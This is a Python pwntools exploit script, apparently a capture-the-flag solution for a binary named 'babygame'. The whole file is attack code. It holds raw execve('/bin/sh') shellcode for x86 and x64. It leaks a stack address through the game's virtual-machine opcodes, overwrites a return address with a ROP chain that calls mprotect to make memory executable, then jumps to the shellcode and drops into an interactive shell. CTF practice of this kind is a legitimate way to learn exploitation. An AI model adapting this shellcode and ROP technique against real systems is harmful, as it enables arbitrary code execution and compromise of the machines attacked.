from pwn_debug import *


pdbg=pwn_debug("./babygame")
pdbg.context.terminal=['tmux', 'splitw', '-h']
context.log_level='debug'
pdbg.local("")
pdbg.debug("2.23")
pdbg.remote()

switch=1
if switch==1:
    p=pdbg.run("local")
elif switch==2:
    p=pdbg.run("debug")
elif switch==3:
    p=pdbg.run("remote")
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
bp      = lambda bkp                :pdbg.bp(bkp)
sym     = lambda symbol             :pdbg.sym(symbol)
def bpp():
	bp([])
	input()
#elf=pdbg.elf
#libc=pdbg.libc
sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def mov(dst,src):
    return flat([1,dst,src])
def show():
    return flat([9])
def push_1():
    return flat([7,0x65])
def push_2():
    return flat([7,0x66])
def pop_1():
    return flat([8,0x65])
def pop_2():
    return flat([8,0x66])
#bp([0x0400F28])
stack_ptr_addr=0x6CE3B0
mov_base_addr=0x6CDD60
env_addr=0x6CD640
mprotect_addr=0x4409d0
code_addr=0x6CE3C0
pay=''
for i in range(10):
    pay+=push_1()
pay+=mov((stack_ptr_addr-mov_base_addr)/8,0x6CD640+0xc8)+pop_1()+show()+p64(0xff)
sla(':\n',1)
sla('>>',pay)
sla(':\n',2)

ru('1:')
stack_base=int(ru('\n'),16)
print hex(stack_base)

ret_addr=stack_base-0x160

pop_rdi=0x0000000000401ca6
pop_rsi=0x0000000000401dc7
pop_rdx=0x00000000004432f6

pay=''
pay+=mov((stack_ptr_addr-mov_base_addr)/8,ret_addr-0x8+0xc8)
rop_chain=[pop_rdi,0x6CE000,pop_rsi,0x2000,pop_rdx,7,mprotect_addr,code_addr+0x200]
for i in range(len(rop_chain)):
    pay+=mov(0x65,rop_chain[i]+0xc8)
    pay+=push_1()
pay+=p64(0xff)
pay=pay.ljust(0x200,'\x00')
pay+=sh_x64_21
sla(':\n',1)
sla('>>',pay)
bp([0x0400F28])
sla(':\n',2)






it()
